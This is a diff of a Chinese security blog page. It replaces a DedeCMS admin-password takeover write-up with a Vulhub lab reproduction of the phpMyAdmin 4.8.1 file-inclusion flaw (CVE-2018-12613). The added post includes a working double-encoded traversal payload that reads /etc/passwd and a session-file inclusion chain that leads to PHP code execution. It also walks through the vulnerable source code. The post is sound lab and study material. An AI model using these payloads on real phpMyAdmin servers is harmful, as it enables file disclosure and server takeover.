@@ -15,32 +15,28 @@
 
 
 
-<meta name="description" content="前言 今天复现一个最重要的漏洞，管理员后台密码修改">
-<meta name="keywords" content="代码审计,CMS漏洞">
+<meta name="description" content="前言 跟着复现一下漏洞，顺便审一下phpmyadmin的源码">
+<meta name="keywords" content="Vulhub,漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DedeCMS代码审计Day3">
-<meta property="og:url" content="http://yoursite.com/2018/09/01/DedeCMS3/index.html">
+<meta property="og:title" content="Vulhub-phpmyadmin4-8-1远程文件包含漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/10/22/Vulhub-phpmyadmin4-8-1远程文件包含/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="前言 今天复现一个最重要的漏洞，管理员后台密码修改">
+<meta property="og:description" content="前言 跟着复现一下漏洞，顺便审一下phpmyadmin的源码">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/7.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/30.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/31.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/32.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/33.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/26.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/27.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/28.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/29.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/34.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/35.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/36.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/37.jpg">
-<meta property="og:updated_time" content="2018-09-01T12:43:00.196Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/40.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/8.png">
+<meta property="og:updated_time" content="2018-10-22T15:12:46.703Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DedeCMS代码审计Day3">
-<meta name="twitter:description" content="前言 今天复现一个最重要的漏洞，管理员后台密码修改">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/7.jpg">
+<meta name="twitter:title" content="Vulhub-phpmyadmin4-8-1远程文件包含漏洞">
+<meta name="twitter:description" content="前言 跟着复现一下漏洞，顺便审一下phpmyadmin的源码">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/40.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -72,7 +68,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>DedeCMS代码审计Day3 | Double--R blog</title>
+<title>Vulhub-phpmyadmin4-8-1远程文件包含漏洞 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -324,11 +320,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-DedeCMS3" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Vulhub-phpmyadmin4-8-1远程文件包含" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/09/01/DedeCMS3/" class="article-date">
-      <time datetime="2018-09-01T11:39:15.000Z" itemprop="datePublished">2018-09-01</time>
+      <a href="/2018/10/22/Vulhub-phpmyadmin4-8-1远程文件包含/" class="article-date">
+      <time datetime="2018-10-22T13:59:15.000Z" itemprop="datePublished">2018-10-22</time>
 </a>
 
 
@@ -343,7 +339,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      DedeCMS代码审计Day3
+      Vulhub-phpmyadmin4-8-1远程文件包含漏洞
     </h1>
   
 
@@ -352,7 +348,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">836字</span>
+			<span class="post-count">1,405字</span>
 		</span>
 	</span>
 	
@@ -361,7 +357,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-hourglass-half"></i>
 			<span class="post-meta-item-text"> 阅读时长: </span>
-			<span class="post-count">3分</span>
+			<span class="post-count">5分</span>
 		</span>
 	</span>
 </div>
@@ -374,7 +370,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CMS漏洞/">CMS漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub/">Vulhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -385,43 +381,68 @@
       
           
         <p><strong>前言</strong></p>
-<p>今天复现一个最重要的漏洞，管理员后台密码修改</p>
+<p>跟着复现一下漏洞，顺便审一下phpmyadmin的源码</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/7.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/40.jpg" alt=""></p>
 <a id="more"></a>
 <hr>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>上篇博客我复现了前台任意用户密码修改的漏洞，dedecms还有一个漏洞是管理员的前台密码修改会同时修改后台密码，通过前台任意用户密码修改的漏洞，我们就能修改管理员的密码。</p>
-<h2 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h2><p>前台任意用户密码重置漏洞的审计我前面有讲，这里主要看管理员前台重置其后台密码的代码。首先我们登陆前台，它的系统设置功能中有个基本资料更新，可以更新其前台密码，其文件是edit_baseinfo.php</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/30.jpg" alt=""></p>
-<p>我们去查看该文件的源码，重点是这一部分</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/31.jpg" alt=""></p>
-<p>当它判断当前账号为管理员是，为了方便管理员，它在修改前台密码的同时也会同时修改管理员的后台密码，这就带来了极大的风险。</p>
-<p>它判断当前账号是否为管理员的方式也很简单，当<code>$cfg_ml-&gt;fields[&#39;matt&#39;]</code>等于10时当前账号就是管理原账号，我们追踪<code>$cfg-ml-&gt;fields</code>，看它的值是如何获取的。</p>
-<p>在<code>DedeCMS\uploads\m\view.php</code>文件中，<code>$cfg_ml</code>调用了<code>Memberlogin</code>类，也就是控制会员登陆的类。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg_ml = new MemberLogin();</span><br></pre></td></tr></table></figure>
-<p>我们继追踪这个类</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/32.jpg" alt=""></p>
-<p>当这个类生成时，就会根据<code>M_ID</code>去查询会员表member，将查询结果赋值给<code>$this-&gt;fields</code>，我们去看一下表结构</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/33.jpg" alt=""></p>
-<p>里面有一个字段matt，代表账号权限，admin账号的权限为10，是最高权限。所以我们只要登陆到管理员的前台就能修改到后台密码。但是我们不知道管理员的密码，而且管理员的前台是不能直接登陆的。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>虽然dedecms对管理员的前台登陆做出了限制，但是我们利用前台任意用户密码修改漏洞是能绕过这些限制的。我们可以任意用户前台密码修改管理员的前台密码，不过这里的修改并不会更改后台，但是为了更好的用户体验，当密码修改成功后会自动跳转到当前账号的前台，我们可以在那里修改管理员的前台密码，这是后台密码也跟着变了。这里我只演示第二种方法。</p>
-<p>跟之前的步骤都是一样的，发送特定请求</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/26.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/27.jpg" alt=""></p>
-<p>更改密码</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/28.jpg" alt=""></p>
-<p>修改成功后等待跳转</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/29.jpg" alt=""></p>
-<p>跳转后成功登陆到管理员的前台</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/34.jpg" alt=""></p>
-<p>到系统设置里更改前台密码，这里有一个原登陆密码是必填的，虽然之前管理员的密码我们不知道，但是这并不影响，因为在跳转之前我们已经改过密码了。这里原密码填你修改的密码就行，邮箱随便填一个。这里我们管理员的最初的密码是admin，我们跳转前将它修改为123456，最后我们把它修改成了666</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/35.jpg" alt=""></p>
-<p>密码修改成功!</p>
-<p>如果这时候我们知道后台的目录，直接访问后台目录，然后用修改的密码登陆，就能登陆成为管理员</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/36.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/37.jpg" alt=""></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
+<p>连接服务器，进入目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ../vulhub/phpmyadmin/CVE-2018-12613</span><br></pre></td></tr></table></figure>
+<p>创建镜像，启动容器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>环境启动后，访问<code>http://your-ip:8080</code>，即可进入phpmyadmin。配置的是“config”模式，所以无需输入密码，直接登录test账户。</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/1.png" alt=""></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>访问<code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>，可见<code>/etc/passwd</code>被读取，说明文件包含漏洞存在：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/2.png" alt=""></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里我们对phpmyadmin的部分源码做一次审计，首先我们来看一下index.php文件对target参数的处理：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/3.png" alt=""></p>
+<p>这部分代码在文件的55-63行，他先在if语句里做了五个判断：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br></pre></td></tr></table></figure>
+<p>先判断target参数是否为空，非空为真</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_string($_REQUEST[<span class="string">'target'</span>]</span><br></pre></td></tr></table></figure>
+<p>再判断target参数的值是否为字符串，是字符串为真</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>]</span><br></pre></td></tr></table></figure>
+<p>正则表达式判断target参数的值开头是否为index，不是为真</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br></pre></td></tr></table></figure>
+<p>判断参数target参数的值是否在黑名单中，黑名单内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>不在为真</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br></pre></td></tr></table></figure>
+<p>在通过自定义函数chekPageValidity函数对参数进行进一步过滤。</p>
+<p>当这五个判断都为真时，进行文件包含，包含target参数的值。</p>
+<p>我们追踪一下checkPageValidity函数，看它什么时候返回真。函数定义在Core.php文件的445-476行</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/4.png" alt=""></p>
+<p>函数有两个形参，一个是page，也就是我们调用时传入的$_REQUEST[‘target’]。一个是whitelist，默认为空。函数内有五个if判断，我们一个一个来看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先判断$whitelist是否为空，为空则引用静态声明的$goto_whitelist。$whitelist默认为空，我们直接来看$goto_whitelist的值</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/5.png" alt=""></p>
+<p>开发人员的安全意识很高，他通过白名单的形式来定义一些可以被包含的文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再判断出入的$page参数是否为空和是否为字符串，如果为空或者不是字符串则返回false。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>判断$page是否在白名单中，如果在则返回true</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">	$page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对$page参数做一次截取，从第一个截取到问号第一次出现的位置。phpmyadmin的开发团队考虑的很全面，想到了会存在target的值后面再跟参数的情况。他们这样做是为了当targe参数中的文件名含有参数时也能进行文件包含。例如我们的target参数为index.php?a=1，那么它将截取index.php。并判断截取后的字符串是否在白名单$whitelist中，如果在就返回true。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>本来写到上一个判断就已经足够了，但是phpmyadmin的开发团队考虑的太全面了，它们考虑到问号可能存在url编码的情况，所以它们对$page进行了一次url解码，然后再根据问号截取字符串，判断截取的字符串是否在白名单中。这就是这一个比较多余的判断导致了漏洞的产生。</p>
+<p>我们来看看我们之前测试的payload是如何通过这些判断的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>我们传入的targe参数的值是<code>db_sql.php%253f/../../../../../../../../etc/passwd</code>，这里我们先来解释一下<code>%253f</code>是什么，它是问号的二次url编码。问号的一次url编码为<code>%3f</code>，<code>%3f</code>在进行一次url编码为<code>%253f</code>。所以我们的参数先经过一次浏览器的url解码传给phpmyadmin的值为<code>db_sql.php%3f/../../../../../../../../etc/passwd</code>。显然它都能通过index.php文件中的if判断。当它作为$page参数进入checkPageValidity函数后，显然这个值不在白名单中，而且它其中也没有问号。所以它都通不过函数中的第三个和第四个if判断。但它经过第五个if判断之前的url解码后就变成了<code>db_sql.php?/../../../../../../../../etc/passwd</code>，截取以后变成了<code>db_sql.php</code>(这里参考博客写错了，它截取的结果不是index.php)。而我们可以看到这个值在白名单中，所以它最后会返回ture。这样我们就通过了所有的判断，程序就会包含我们target的参数值。但它最后包含的可不是db_sql.php，它包含的是<code>db_sql.php%253f/../../../../../../../../etc/passwd</code>，首先db_sql.php%253f这个文件肯定是不存在的。不过它存不存在并不影响，我们通过<code>../</code>进行路径穿越，最后我们会跳转到<code>/etc/passwd</code>路径下，最后包含的就是passwd文件。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>phpmyadmin会将SQL语句的操作写入到session文件中，而session文件的路径我们是知道的，session文件的名称格式也是已知，所以我们能利用这些条件往session文件中写入webshell。利用方式也很简单。我们先执行一下<code>SELECT &#39;&lt;?php phpinfo() ?&gt;&#39;</code>。</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/6.png" alt=""></p>
+<p>然后查看一下phpmyadmin的session值。</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/7.png" alt=""></p>
+<p>然后访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_session值</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/8.png" alt=""></p>
+<p>phpinfo被执行。</p>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=429318&auto=1&height=66"></iframe></div>
+<p><strong>参考链接：</strong></p>
+<p><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/" target="_blank" rel="noopener">vulhub-phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</a></p>
+<p><a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">简书-phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</a></p>
+<hr>
+<div align="center"><iframe frameborder="no" border="0" width="100" height="46" src="  http://sc1.111ttt.cn/2015/1/05/23/98230414050.mp3"></iframe></div>
 
 
       
@@ -431,13 +452,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/09/01/DedeCMS3/">DedeCMS代码审计Day3</a></p>
+        <p><span>本文标题:</span><a href="/2018/10/22/Vulhub-phpmyadmin4-8-1远程文件包含/">Vulhub-phpmyadmin4-8-1远程文件包含漏洞</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-09-01, 19:39:15</p>
-        <p><span>最后更新:</span>2018-09-01, 20:43:00</p>
+        <p><span>发布时间:</span>2018-10-22, 21:59:15</p>
+        <p><span>最后更新:</span>2018-10-22, 23:12:46</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/09/01/DedeCMS3/" title="DedeCMS代码审计Day3">http://yoursite.com/2018/09/01/DedeCMS3/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/01/DedeCMS3/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/10/22/Vulhub-phpmyadmin4-8-1远程文件包含/" title="Vulhub-phpmyadmin4-8-1远程文件包含漏洞">http://yoursite.com/2018/10/22/Vulhub-phpmyadmin4-8-1远程文件包含/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/22/Vulhub-phpmyadmin4-8-1远程文件包含/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -449,16 +470,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/09/01/JAVA1/">
-                    Java学习笔记（一）--Java语言基础
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/08/22/ThinkPHP11/">
-                    ThinkPHP框架学习--缓存
+                <a href="/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/">
+                    Vulhub-ActiveMQ--反序列化漏洞
                 </a>
             </div>
         
@@ -470,7 +485,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞信息"><span class="toc-number">1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#审计过程"><span class="toc-number">2.</span> <span class="toc-text">审计过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试"><span class="toc-number">2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li></ol>
         
     </div>
     <style>
@@ -506,7 +521,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"DedeCMS代码审计Day3　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Vulhub-phpmyadmin4-8-1远程文件包含漏洞　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -526,15 +541,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/09/01/JAVA1/" title="上一篇: Java学习笔记（一）--Java语言基础">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/08/22/ThinkPHP11/" title="下一篇: ThinkPHP框架学习--缓存">
+            <a href="/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/" title="下一篇: Vulhub-ActiveMQ--反序列化漏洞">
                 <i class="fa fa-angle-right"></i>
             </a>
         
